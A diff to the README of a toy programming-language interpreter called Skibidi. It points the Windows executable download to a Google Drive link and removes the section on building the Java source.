@@ -12,7 +12,7 @@
 ### Running Skibidi Programs
 
 #### Option 1: Using the Executable (.exe) - Windows Only
-1. **Download** `SkibidiInterpreter.exe` from `/build/SkibidiInterpreter/`
+1. **Download** `SkibidiInterpreter.exe` from `https://drive.google.com/file/d/1GmuGYwEtPtEedpd-mDwiosLj4V6Z8Iiy/view?usp=sharing`
 2. **Open** Command Prompt or PowerShell
 3. **Run** your Skibidi program:
 
@@ -229,22 +229,6 @@ SkibidiInterpreter.exe examples/pattern.skibidi
 - ✅ Ternary-like conditional expressions
 - ✅ Basic REPL mode for interactive coding
 
-
-
-## 🛠️ Building from Source
-
-If you want to modify or contribute to Skibidi:
-
-1. **Clone** the repository
-2. **Navigate** to the `skibidi/` folder
-3. **Compile** the Java files:
-   ```bash
-   javac *.java
-   ```
-4. **Run** your program:
-   ```bash
-   java skibidi.Skibidi your_program.skibidi
-   ```
 
 ## 📁 Project Structure
 
